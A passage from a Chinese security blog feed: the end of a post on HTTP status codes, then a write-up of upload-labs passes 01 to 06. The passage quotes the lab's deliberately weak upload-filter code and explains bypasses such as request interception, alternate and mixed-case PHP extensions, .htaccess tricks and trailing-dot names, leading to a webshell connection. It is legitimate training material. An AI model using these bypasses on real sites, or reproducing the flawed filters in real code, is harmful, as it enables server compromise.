302”（已移动）暂时）何时将其移至其他位置。<br>有关HTTP状态代码的信息来自RFC2616（Jun1999）（已淘汰RFC2068（Jan1997），并已由RFC2817（May2000）更新）第6.1.1节：状态代码和原因短语，在第10章中有详细说明：状态码定义。<br>Status-Code元素是3位数的整数结果代码，用于尝试理解和满足请求。原因短语旨在简要说明状态代码。状态码供自动机使用，原因短语供人类用户使用。不需要客户检查或显示原因短语。<br>状态代码的第一位数字定义响应的类别。后两位数字没有任何分类作用。第一位数字有5个值：<br> • 1xx：信息性-收到请求，继续进行<br> • 2xx：成功-该动作已成功接收，理解并接受<br> • 3xx：重定向-必须采取进一步的措施才能完成请求<br> • 4xx：客户端错误-请求包含错误的语法或无法满足<br> • 5xx：服务器错误-服务器无法满足看似有效的请求<br>下面介绍了为HTTP &#x2F; 1.1定义的数字状态代码的各个值以及一组相应的“原因短语”示例。仅建议使用此处列出的原因短语-可以用本地等效项替换它们，而不会影响协议，但是短语必须仅包含文本，不能包含CR和LF字符。</p><p>100：继续<br>101：交换协议<br>200：确定<br>201：创建<br>202：接受<br>203：非权威信息<br>204：无内容<br>205：重置内容<br>206：部分内容<br>300：多项选择<br>301：永久移动<br>302：临时移动<br>303：查看其他<br>304：未修改<br>305：使用代理<br>307：临时重定向<br>400：错误的请求<br>401：未经授权<br>402：需要付款<br>403：禁止<br>404：找不到方法<br>405：不允许的方法<br>406：不可接受的<br>407：需要代理身份验证<br>408：请求超时<br>409：冲突<br>410：已消失<br>411：所需长度<br>412：前提条件失败<br>413：请求实体太大<br>414：请求-URI太大<br>415：不支持的媒体类型<br>416：无法满足请求的范围<br>417：预期失败<br>500：内部服务器错误<br>501：未实现<br>502：错误的网关<br>503：服务不可用<br>504：网关超时<br>505：不支持HTTP版本</p><p>HTTP状态代码是可扩展的。不需要HTTP应用程序理解所有已注册状态代码的含义，尽管显然希望这样。但是，应用程序务必如第一位数字所示理解任何状态码的类别，并将任何无法识别的响应视为等同于该类的x00状态码，但不可识别的响应必须被缓存。例如，如果客户端接收到无法识别的状态码431，则它可以安全地假定其请求有问题，并将响应视为已接收到400状态码。在这种情况下，用户代理应该向用户呈现随响应一起返回的实体，因为该实体可能包含人类可读的信息，这些信息将解释异常状态。 </p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传漏洞靶场通关</title>
      <link href="/2023/07/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/"/>
      <url>/2023/07/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/</url>
      
        <content type="html"><![CDATA[<h1 id="前言：记录一下学习。所用到的靶场在github上"><a href="#前言：记录一下学习。所用到的靶场在github上" class="headerlink" title="#前言：记录一下学习。所用到的靶场在github上."></a>#前言：记录一下学习。所用到的靶场在<a href="https://github.com/c0ny1/upload-labs">github</a>上.</h1><h2 id="pass–01"><a href="#pass–01" class="headerlink" title="pass–01"></a>pass–01</h2><p>​               </p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">通过观察发现这个源码是前端代码，而前端进行文件检测等于没有检测，我们进行抓包更改为php文件即可。</span><br></pre></td></tr></table></figure><p>​             </p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">checkFile</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> file = <span class="variable language_">document</span>.<span class="title function_">getElementsByName</span>(<span class="string">&#x27;upload_file&#x27;</span>)[<span class="number">0</span>].<span class="property">value</span>;</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&quot;请选择要上传的文件!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//定义允许上传的文件类型</span></span><br><span class="line">    <span class="keyword">var</span> allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span>;</span><br><span class="line">    <span class="comment">//提取上传文件的类型</span></span><br><span class="line">    <span class="keyword">var</span> ext_name = file.<span class="title function_">substring</span>(file.<span class="title function_">lastIndexOf</span>(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">    <span class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line">    <span class="keyword">if</span> (allow_ext.<span class="title function_">indexOf</span>(ext_name + <span class="string">&quot;|&quot;</span>) == -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> errMsg = <span class="string">&quot;该文件不允许上传，请上传&quot;</span> + allow_ext + <span class="string">&quot;类型的文件,当前文件类型为：&quot;</span> + ext_name;</span><br><span class="line">        <span class="title function_">alert</span>(errMsg);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202307090914043.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用蚁剑进行连接</span><br></pre></td></tr></table></figure><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202307090916789.png"></p><h2 id="pass–02"><a href="#pass–02" class="headerlink" title="pass–02"></a>pass–02</h2><p>​    </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">观察源码发现这个代码只对文件上传类型进行了限制，我们仍然可以抓包修改jpg 为php 文件</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/gif&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]            </span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件类型不正确，请重新上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH.<span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202307090924174.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">进行连接</span><br></pre></td></tr></table></figure><h2 id="pass–03"><a href="#pass–03" class="headerlink" title="pass–03"></a>pass–03</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">这次对文件的上传进行了后缀的限制，可以看出这是个黑名单--不允许上传给出的文件后缀名. 将1.php名字改为1.php4(php1,php2,php3,php4,php5),phtml，</span><br></pre></td></tr></table></figure><p>​     </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&#x27;.asp&#x27;</span>,<span class="string">&#x27;.aspx&#x27;</span>,<span class="string">&#x27;.php&#x27;</span>,<span class="string">&#x27;.jsp&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="title function_ invoke__">rand</span>(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;            </span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                 <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202307090939300.png"></p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202307090942457.png"></p><h2 id="pass–04"><a href="#pass–04" class="headerlink" title="pass–04"></a>pass–04</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">通过源码可以看到对文件后缀进行了全面封杀。这时可以用到.htaccess 文件对上传的jpg 文件都解析为php文件</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.php1&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.pHp1&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件不允许上传!&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AddType 指令可以将给定的文件扩展名映射到指定的内容类型。 将jpg文件解析为php文件。 去网上查了一下 在进行上述实战时，不要使用新版本的phpstudy，新版本的phpstudy对.htaccess支持存在问题，推荐使用2018版本的phpstudy。</span><br><span class="line">原创不易，我用的好像是新版所以上传之后解析不成php文件</span><br></pre></td></tr></table></figure><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202307090955543.png"></p><h2 id="pass–05"><a href="#pass–05" class="headerlink" title="pass–05"></a>pass–05</h2><p>​     </p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">根据源码 可以看出只对文件后缀名进行了处理。去掉了文件名末尾的点，取了点后面的后缀名。并进行了小写转换。在和数组里面的后缀名匹配如果出现一样的不允许上传，根据这个我们可以使用1.php. . 先去掉末尾的点只剩下1.php. 他再取.后面的值只有空格。最后只剩下1.php. 便绕过了他的检测机制。</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202307091119004.png"></p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202307091120236.png"></p><h2 id="pass–06"><a href="#pass–06" class="headerlink" title="pass–06"></a>pass–06</h2><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">这个代码居然把转换小写功能去掉了，这样我们可以用大小写来绕过检测。</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="title function_ invoke__">rand</span>(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span 